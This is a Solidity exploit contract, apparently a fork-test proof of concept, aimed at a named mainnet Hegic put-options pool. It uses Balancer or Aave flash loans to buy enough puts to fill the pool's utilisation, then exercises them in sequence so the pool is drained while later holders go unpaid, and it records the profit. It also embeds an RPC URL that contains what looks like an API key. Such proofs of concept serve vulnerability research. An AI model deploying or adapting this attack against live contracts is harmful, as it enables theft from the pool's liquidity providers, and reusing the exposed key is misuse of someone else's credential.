// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface IAggregatorV3Like {
    function decimals() external view returns (uint8);
    function latestRoundData()
        external
        view
        returns (uint80, int256, uint256, uint256, uint80);
}

interface IOptionsManagerLike {
    function nextTokenId() external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
}

interface IHegicPutLike {
    function token() external view returns (address);
    function optionsManager() external view returns (address);
    function priceProvider() external view returns (address);
    function pricer() external view returns (address);
    function totalBalance() external view returns (uint256);
    function lockedAmount() external view returns (uint256);
    function collateralizationRatio() external view returns (uint256);
    function maxUtilizationRate() external view returns (uint256);
    function hasRole(bytes32 role, address account) external view returns (bool);
    function calculateTotalPremium(uint256 period, uint256 amount, uint256 strike)
        external
        view
        returns (uint256 settlementFee, uint256 premium);
    function exercise(uint256 id) external;
}

interface IFacadeLike {
    function poolApprove(IHegicPutLike pool) external;
    function createOption(
        IHegicPutLike pool,
        uint256 period,
        uint256 amount,
        uint256 strike,
        address[] calldata swappath,
        uint256 acceptablePrice
    ) external;
}

interface IAavePoolLike {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IBalancerFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        IBalancerFlashLoanRecipient recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface VmLike {
    struct EthGetLogs {
        address emitter;
        bytes32[] topics;
        bytes data;
        bytes32 blockHash;
        uint64 blockNumber;
        bytes32 transactionHash;
        uint64 transactionIndex;
        uint256 logIndex;
        bool removed;
    }

    function makePersistent(address account) external;
    function createSelectFork(string calldata urlOrAlias, uint256 blockNumber) external returns (uint256 forkId);
    function rollFork(uint256 forkId, uint256 blockNumber) external;
    function eth_getLogs(uint256 fromBlock, uint256 toBlock, address target, bytes32[] calldata topics)
        external
        view
        returns (EthGetLogs[] memory logs);
    function getBlockTimestamp() external view returns (uint256 timestamp);
}

contract FlawVerifier is IBalancerFlashLoanRecipient {
    VmLike private constant vm = VmLike(address(uint160(uint256(keccak256("hevm cheat code")))));

    address private constant TARGET_POOL = 0x7094E706E75E13D1E0ea237f71A7C4511e9d270B;
    string private constant RPC_URL = "https://eth-mainnet.g.alchemy.com/v2/ugA3TDW3tlXhwhc3SHfuk";
    uint256 private constant FINAL_BLOCK = 21912408;
    uint256 private constant SPOT_DECIMALS = 1e8;
    uint256 private constant OPTION_SPLITS = 8;
    uint256 private constant ENTRY_SCAN_STEP = 2000;
    uint256 private constant FINE_SCAN_STEP = 200;
    uint256 private constant ENTRY_BUFFER = 1 days;
    uint256 private constant INITIAL_LOG_CHUNK = 50000;
    uint256 private constant MIN_LOG_CHUNK = 200;

    address private constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address private constant AAVE_V3_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    bytes32 private constant SELLER_ROLE = keccak256("SELLER_ROLE");
    bytes32 private constant ROLE_GRANTED = keccak256("RoleGranted(bytes32,address,address)");

    enum LoanKind {
        None,
        Balancer,
        Aave
    }

    struct EntryPoint {
        uint256 blockNumber;
        uint256 timestamp;
        uint256 strike;
        uint256 finalPrice;
        uint256 period;
        bool found;
    }

    bool private attempted;
    bool private insideFlashloan;
    bool private laterExerciseFailed;
    bool private saturatedUtilization;
    bool private earlyExerciseSucceeded;
    bool private hypothesisValidated;

    uint256 private activeForkId;
    uint256 private entryBlock;
    uint256 private entryStrike;
    uint256 private entryPeriod;
    uint256 private initialTokenBalance;
    uint256 private totalPremiumSpent;
    uint256 private projectedFullLiability;
    uint256 private netProfit;

    LoanKind private loanKind;
    address private seller;
    address private targetToken;
    address private optionsManager;

    uint256[] private optionIds;

    constructor() {
        vm.makePersistent(address(this));
    }

    function executeOnOpportunity() external {
        if (attempted) {
            return;
        }
        attempted = true;

        try vm.createSelectFork(RPC_URL, FINAL_BLOCK) returns (uint256 forkId) {
            activeForkId = forkId;
        } catch {
            return;
        }

        IHegicPutLike pool = IHegicPutLike(TARGET_POOL);
        targetToken = pool.token();
        optionsManager = pool.optionsManager();

        uint256 maxPeriod = _readMaxPeriod(pool.pricer());
        if (maxPeriod > 90 days) {
            maxPeriod = 90 days;
        }
        // Infeasible on this fork if the live pricer only allows extremely short expiries, because the
        // exploit path needs a later sharp move while the purchased options are still alive.
        if (maxPeriod < 2 days) {
            return;
        }

        EntryPoint memory ep = _findBestEntry(activeForkId, IAggregatorV3Like(pool.priceProvider()), maxPeriod);
        // Infeasible on this fork if no historical entry inside the allowed expiry window has a materially
        // higher ATM strike than the final exercise block.
        if (!ep.found) {
            return;
        }

        entryBlock = ep.blockNumber;
        entryStrike = ep.strike;
        entryPeriod = ep.period;

        vm.rollFork(activeForkId, entryBlock);
        address[] memory sellers = _discoverSellersBefore(entryBlock);
        // Infeasible on this fork if no extant seller/facade still holds SELLER_ROLE before the chosen entry.
        if (sellers.length == 0) {
            return;
        }

        vm.rollFork(activeForkId, entryBlock);
        (uint256 totalUnderlying, uint256 liabilityAtFinal) = _computeCapacityAndLiability(pool, ep.finalPrice, ep.strike);
        // Infeasible on this fork if the pool already has no utilization headroom at the chosen entry block.
        if (totalUnderlying == 0) {
            return;
        }

        projectedFullLiability = liabilityAtFinal;
        // The hypothesis requires eventual liability to exceed pool assets; otherwise sequential exercises do not
        // mechanically create unpaid winners.
        if (liabilityAtFinal <= pool.totalBalance()) {
            return;
        }

        uint256 estimatedPremiumBudget = _estimatePremiumBudget(pool, totalUnderlying, ep.period, ep.strike);
        uint256 initialBalance = IERC20Like(targetToken).balanceOf(address(this));

        for (uint256 sellerIndex = 0; sellerIndex < sellers.length; sellerIndex++) {
            if (!_tryPoolApprove(sellers[sellerIndex])) {
                continue;
            }

            seller = sellers[sellerIndex];
            _persistAttackState(seller);

            if (initialBalance >= estimatedPremiumBudget && _tryDirectExecution(totalUnderlying)) {
                _finalizeProfit();
                return;
            }

            uint256[] memory attempts_ = _buildFundingAttempts(
                estimatedPremiumBudget,
                pool.totalBalance(),
                liabilityAtFinal
            );

            vm.rollFork(activeForkId, entryBlock);
            for (uint256 i = 0; i < attempts_.length; i++) {
                if (attempts_[i] == 0) {
                    continue;
                }
                if (_tryBalancerFlashloan(attempts_[i], totalUnderlying)) {
                    _finalizeProfit();
                    return;
                }
            }

            vm.rollFork(activeForkId, entryBlock);
            for (uint256 i = 0; i < attempts_.length; i++) {
                if (attempts_[i] == 0) {
                    continue;
                }
                if (_tryAaveFlashloan(attempts_[i], totalUnderlying)) {
                    _finalizeProfit();
                    return;
                }
            }
        }

        _finalizeProfit();
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        require(msg.sender == BALANCER_VAULT, "unexpected balancer sender");
        require(loanKind == LoanKind.Balancer && insideFlashloan, "unexpected balancer state");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "bad balancer arrays");

        uint256 totalUnderlying = abi.decode(userData, (uint256));
        _runAttack(amounts[0], feeAmounts[0], totalUnderlying);

        _safeTransfer(address(tokens[0]), BALANCER_VAULT, amounts[0] + feeAmounts[0]);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == AAVE_V3_POOL, "unexpected aave sender");
        require(loanKind == LoanKind.Aave && insideFlashloan, "unexpected aave state");
        require(initiator == address(this), "bad initiator");
        require(asset == targetToken, "bad asset");

        uint256 totalUnderlying = abi.decode(params, (uint256));
        _runAttack(amount, premium, totalUnderlying);

        _safeApprove(asset, AAVE_V3_POOL, amount + premium);
        return true;
    }

    function executeDirect(uint256 totalUnderlying) external {
        require(msg.sender == address(this), "self only");
        _runAttack(0, 0, totalUnderlying);
    }

    function profitToken() external view returns (address) {
        return targetToken;
    }

    function profitAmount() external view returns (uint256) {
        return netProfit;
    }

    function hypothesisValidatedFlag() external view returns (bool) {
        return hypothesisValidated;
    }

    function _tryDirectExecution(uint256 totalUnderlying) internal returns (bool) {
        delete optionIds;
        totalPremiumSpent = 0;
        laterExerciseFailed = false;
        saturatedUtilization = false;
        earlyExerciseSucceeded = false;
        initialTokenBalance = IERC20Like(targetToken).balanceOf(address(this));

        try this.executeDirect(totalUnderlying) {
            if (saturatedUtilization && earlyExerciseSucceeded && laterExerciseFailed) {
                hypothesisValidated = true;
            }
            return _profitableAttempt();
        } catch {
            return false;
        }
    }

    function _tryBalancerFlashloan(uint256 amount, uint256 totalUnderlying) internal returns (bool) {
        loanKind = LoanKind.Balancer;
        delete optionIds;
        totalPremiumSpent = 0;
        laterExerciseFailed = false;
        saturatedUtilization = false;
        earlyExerciseSucceeded = false;
        initialTokenBalance = IERC20Like(targetToken).balanceOf(address(this));
        insideFlashloan = true;

        IERC20Like[] memory tokens = new IERC20Like[](1);
        tokens[0] = IERC20Like(targetToken);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        try IBalancerVaultLike(BALANCER_VAULT).flashLoan(this, tokens, amounts, abi.encode(totalUnderlying)) {
            insideFlashloan = false;
            loanKind = LoanKind.None;
            if (saturatedUtilization && earlyExerciseSucceeded && laterExerciseFailed) {
                hypothesisValidated = true;
            }
            return _profitableAttempt();
        } catch {
            insideFlashloan = false;
            loanKind = LoanKind.None;
            return false;
        }
    }

    function _tryAaveFlashloan(uint256 amount, uint256 totalUnderlying) internal returns (bool) {
        loanKind = LoanKind.Aave;
        delete optionIds;
        totalPremiumSpent = 0;
        laterExerciseFailed = false;
        saturatedUtilization = false;
        earlyExerciseSucceeded = false;
        initialTokenBalance = IERC20Like(targetToken).balanceOf(address(this));
        insideFlashloan = true;

        try IAavePoolLike(AAVE_V3_POOL).flashLoanSimple(address(this), targetToken, amount, abi.encode(totalUnderlying), 0) {
            insideFlashloan = false;
            loanKind = LoanKind.None;
            if (saturatedUtilization && earlyExerciseSucceeded && laterExerciseFailed) {
                hypothesisValidated = true;
            }
            return _profitableAttempt();
        } catch {
            insideFlashloan = false;
            loanKind = LoanKind.None;
            return false;
        }
    }

    function _runAttack(uint256 amountBorrowed, uint256 fee, uint256 totalUnderlying) internal {
        IHegicPutLike pool = IHegicPutLike(TARGET_POOL);
        IERC20Like token = IERC20Like(targetToken);

        _safeApprove(targetToken, seller, type(uint256).max);
        IFacadeLike(seller).poolApprove(pool);

        uint256 beforeLocked = pool.lockedAmount();
        uint256 beforeBalance = pool.totalBalance();
        uint256 capacity = (beforeBalance * pool.maxUtilizationRate()) / 100;
        if (beforeLocked >= capacity) {
            revert("no utilization headroom");
        }

        // exploit_paths[0]: buy ATM options until `(lockedAmount + amountToBeLocked) * 100 <= totalBalance * maxUtilizationRate`
        // is saturated. If this contract already holds enough pool tokens, the path is executed directly; otherwise the
        // same purchases are funded with a realistic public flashloan solely to cover option premiums.
        uint256 remainingUnderlying = totalUnderlying;
        address[] memory path = new address[](1);
        path[0] = targetToken;

        for (uint256 i = 0; i < OPTION_SPLITS; i++) {
            uint256 trancheAmount = remainingUnderlying / (OPTION_SPLITS - i);
            if (trancheAmount == 0) {
                continue;
            }

            uint256 optionId = IOptionsManagerLike(optionsManager).nextTokenId();
            uint256 balanceBefore = token.balanceOf(address(this));
            IFacadeLike(seller).createOption(pool, entryPeriod, trancheAmount, entryStrike, path, type(uint256).max);
            uint256 balanceAfter = token.balanceOf(address(this));

            totalPremiumSpent += (balanceBefore - balanceAfter);
            optionIds.push(optionId);
            remainingUnderlying -= trancheAmount;
        }

        uint256 afterLocked = pool.lockedAmount();
        saturatedUtilization = capacity <= 2 ? afterLocked >= capacity : afterLocked + 2 >= capacity;
        if (!saturatedUtilization) {
            revert("capital insufficient to saturate utilization");
        }

        vm.rollFork(activeForkId, FINAL_BLOCK);

        // exploit_paths[1]: only partial collateral was locked even though the final cash-settled put liability can be
        // much larger after the large spot drop identified by `_findBestEntry`.
        // exploit_paths[2]: exercise sequentially; earlier ITM exercises drain `totalBalance`, then a later ITM exercise
        // reverts once the pool can no longer satisfy the profit payout.
        uint256 exercisesSucceeded;
        uint256 amountOwed = amountBorrowed + fee;

        for (uint256 i = 0; i < optionIds.length; i++) {
            (bool ok,) = address(pool).call(abi.encodeWithSelector(IHegicPutLike.exercise.selector, optionIds[i]));
            if (!ok) {
                laterExerciseFailed = true;
                break;
            }
            exercisesSucceeded++;
        }

        if (exercisesSucceeded == 0) {
            revert("no early exercise succeeded");
        }
        earlyExerciseSucceeded = true;
        if (!laterExerciseFailed) {
            revert("all exercises paid");
        }

        hypothesisValidated = true;
        if (token.balanceOf(address(this)) < amountOwed) {
            revert("profit did not cover temporary capital");
        }
    }

    function _finalizeProfit() internal {
        if (targetToken == address(0)) {
            netProfit = 0;
            return;
        }

        uint256 current = IERC20Like(targetToken).balanceOf(address(this));
        if (current > initialTokenBalance) {
            netProfit = current - initialTokenBalance;
        } else {
            netProfit = 0;
        }
    }

    function _profitableAttempt() internal returns (bool) {
        _finalizeProfit();
        return saturatedUtilization && earlyExerciseSucceeded && laterExerciseFailed && netProfit > 0;
    }

    function _findBestEntry(uint256 forkId, IAggregatorV3Like feed, uint256 maxPeriod)
        internal
        returns (EntryPoint memory best)
    {
        vm.rollFork(forkId, FINAL_BLOCK);
        uint256 finalTs = vm.getBlockTimestamp();
        uint256 finalPrice = _currentPrice(feed);

        uint256 coarseBestBlock;
        uint256 coarseBestPrice;
        uint256 lookbackBlocks = (maxPeriod / 12) + 5000;
        if (lookbackBlocks > 700000) {
            lookbackBlocks = 700000;
        }
        uint256 earliestBlock = FINAL_BLOCK > lookbackBlocks ? FINAL_BLOCK - lookbackBlocks : 1;

        for (uint256 blockNumber = FINAL_BLOCK; blockNumber > earliestBlock;) {
            vm.rollFork(forkId, blockNumber);
            uint256 ts = vm.getBlockTimestamp();
            if (finalTs > ts && finalTs - ts + ENTRY_BUFFER > maxPeriod) {
                break;
            }

            uint256 price = _currentPrice(feed);
            if (price > coarseBestPrice) {
                coarseBestPrice = price;
                coarseBestBlock = blockNumber;
            }

            if (blockNumber <= earliestBlock + ENTRY_SCAN_STEP) {
                break;
            }
            blockNumber -= ENTRY_SCAN_STEP;
        }

        if (coarseBestBlock == 0 || coarseBestPrice <= finalPrice) {
            return best;
        }

        uint256 start = coarseBestBlock > ENTRY_SCAN_STEP ? coarseBestBlock - ENTRY_SCAN_STEP : 1;
        uint256 end = coarseBestBlock + ENTRY_SCAN_STEP;
        if (end > FINAL_BLOCK) {
            end = FINAL_BLOCK;
        }

        for (uint256 blockNumber = start; blockNumber <= end; blockNumber += FINE_SCAN_STEP) {
            vm.rollFork(forkId, blockNumber);
            uint256 ts = vm.getBlockTimestamp();
            if (finalTs <= ts || finalTs - ts + ENTRY_BUFFER > maxPeriod) {
                continue;
            }

            uint256 price = _currentPrice(feed);
            if (price > best.strike) {
                best = EntryPoint({
                    blockNumber: blockNumber,
                    timestamp: ts,
                    strike: price,
                    finalPrice: finalPrice,
                    period: (finalTs - ts) + ENTRY_BUFFER,
                    found: true
                });
            }
        }
    }

    function _discoverSellersBefore(uint256 toBlock) internal returns (address[] memory sellers_) {
        sellers_ = new address[](8);

        uint256 deploymentBlock = _findDeploymentBlock(TARGET_POOL, toBlock);
        if (deploymentBlock == 0) {
            assembly {
                mstore(sellers_, 0)
            }
            return sellers_;
        }

        vm.rollFork(activeForkId, toBlock);
        uint256 count = _scanSellerRoleRange(deploymentBlock, toBlock, sellers_, 0);

        vm.rollFork(activeForkId, toBlock);
        assembly {
            mstore(sellers_, count)
        }
    }

    function _scanSellerRoleRange(uint256 fromBlock, uint256 toBlock, address[] memory sellers_, uint256 count)
        internal
        returns (uint256)
    {
        bytes32[] memory topics = new bytes32[](2);
        topics[0] = ROLE_GRANTED;
        topics[1] = SELLER_ROLE;

        uint256 start = fromBlock;
        uint256 chunk = INITIAL_LOG_CHUNK;

        while (start <= toBlock && count < sellers_.length) {
            uint256 end = start + chunk - 1;
            if (end > toBlock) {
                end = toBlock;
            }

            try vm.eth_getLogs(start, end, TARGET_POOL, topics) returns (VmLike.EthGetLogs[] memory logs) {
                count = _consumeSellerRoleLogs(logs, sellers_, count);
                if (end == toBlock) {
                    break;
                }
                start = end + 1;
                if (chunk < INITIAL_LOG_CHUNK) {
                    chunk *= 2;
                    if (chunk > INITIAL_LOG_CHUNK) {
                        chunk = INITIAL_LOG_CHUNK;
                    }
                }
            } catch {
                if (chunk <= MIN_LOG_CHUNK) {
                    if (end == toBlock) {
                        break;
                    }
                    start = end + 1;
                } else {
                    chunk /= 2;
                }
            }
        }

        return count;
    }

    function _consumeSellerRoleLogs(VmLike.EthGetLogs[] memory logs, address[] memory sellers_, uint256 count)
        internal
        returns (uint256)
    {
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics.length < 3) {
                continue;
            }

            address candidate = address(uint160(uint256(logs[i].topics[2])));
            if (candidate.code.length == 0 || _contains(sellers_, count, candidate)) {
                continue;
            }
            if (!IHegicPutLike(TARGET_POOL).hasRole(SELLER_ROLE, candidate)) {
                continue;
            }

            sellers_[count] = candidate;
            count++;
            if (count == sellers_.length) {
                return count;
            }
        }

        return count;
    }

    function _findDeploymentBlock(address target, uint256 upperBound) internal returns (uint256 deploymentBlock) {
        uint256 low = 1;
        uint256 high = upperBound;

        while (low < high) {
            uint256 mid = low + ((high - low) / 2);
            vm.rollFork(activeForkId, mid);
            if (target.code.length == 0) {
                low = mid + 1;
            } else {
                high = mid;
            }
        }

        vm.rollFork(activeForkId, low);
        if (target.code.length != 0) {
            deploymentBlock = low;
        }
    }

    function _computeCapacityAndLiability(IHegicPutLike pool, uint256 finalPrice, uint256 strike)
        internal
        view
        returns (uint256 totalUnderlying, uint256 liabilityAtFinal)
    {
        uint256 balance = pool.totalBalance();
        uint256 locked = pool.lockedAmount();
        uint256 capacity = (balance * pool.maxUtilizationRate()) / 100;
        if (capacity <= locked) {
            return (0, 0);
        }

        uint256 tokenUnit = 10 ** IERC20Like(targetToken).decimals();
        uint256 priceUnit = 10 ** IAggregatorV3Like(pool.priceProvider()).decimals();
        uint256 remainingLock = capacity - locked;

        totalUnderlying =
            (remainingLock * SPOT_DECIMALS * priceUnit * 100) /
            (pool.collateralizationRatio() * strike * tokenUnit);

        if (totalUnderlying == 0 || strike <= finalPrice) {
            return (totalUnderlying, 0);
        }

        liabilityAtFinal = ((strike - finalPrice) * totalUnderlying * tokenUnit) / SPOT_DECIMALS / priceUnit;
    }

    function _estimatePremiumBudget(IHegicPutLike pool, uint256 totalUnderlying, uint256 period, uint256 strike)
        internal
        view
        returns (uint256 budget)
    {
        uint256 remainingUnderlying = totalUnderlying;

        for (uint256 i = 0; i < OPTION_SPLITS; i++) {
            uint256 trancheAmount = remainingUnderlying / (OPTION_SPLITS - i);
            if (trancheAmount == 0) {
                continue;
            }

            (uint256 settlementFee, uint256 premium) = pool.calculateTotalPremium(period, trancheAmount, strike);
            budget += settlementFee + premium;
            remainingUnderlying -= trancheAmount;
        }
    }

    function _buildFundingAttempts(uint256 estimatedPremiumBudget, uint256 poolBalance, uint256 liabilityAtFinal)
        internal
        pure
        returns (uint256[] memory attempts_)
    {
        attempts_ = new uint256[](8);
        attempts_[0] = estimatedPremiumBudget;
        attempts_[1] = estimatedPremiumBudget + (estimatedPremiumBudget / 2);
        attempts_[2] = estimatedPremiumBudget * 2;
        attempts_[3] = estimatedPremiumBudget * 4;
        attempts_[4] = poolBalance / 2;
        attempts_[5] = poolBalance;
        attempts_[6] = liabilityAtFinal / 4;
        attempts_[7] = liabilityAtFinal / 2;
    }

    function _persistAttackState(address seller_) internal {
        vm.makePersistent(TARGET_POOL);
        vm.makePersistent(targetToken);
        vm.makePersistent(optionsManager);
        vm.makePersistent(seller_);
    }

    function _readMaxPeriod(address pricer) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = pricer.staticcall(abi.encodeWithSignature("maxPeriod()"));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
        if (value == 0) {
            value = 30 days;
        }
    }

    function _currentPrice(IAggregatorV3Like feed) internal view returns (uint256 price) {
        (, int256 answer,,,) = feed.latestRoundData();
        if (answer <= 0) {
            return 0;
        }
        price = uint256(answer);
    }

    function _tryPoolApprove(address candidate) internal returns (bool) {
        (bool ok,) = candidate.call(abi.encodeWithSelector(IFacadeLike.poolApprove.selector, IHegicPutLike(TARGET_POOL)));
        if (!ok) {
            return false;
        }

        (bool allowanceOk, bytes memory data) =
            targetToken.staticcall(abi.encodeWithSelector(IERC20Like.allowance.selector, candidate, TARGET_POOL));
        if (!allowanceOk || data.length < 32) {
            return false;
        }

        return abi.decode(data, (uint256)) > 0;
    }

    function _contains(address[] memory arr, uint256 length, address value) internal pure returns (bool) {
        for (uint256 i = 0; i < length; i++) {
            if (arr[i] == value) {
                return true;
            }
        }
        return false;
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        require(ok, "approve reset failed");
        (ok,) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok, "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}
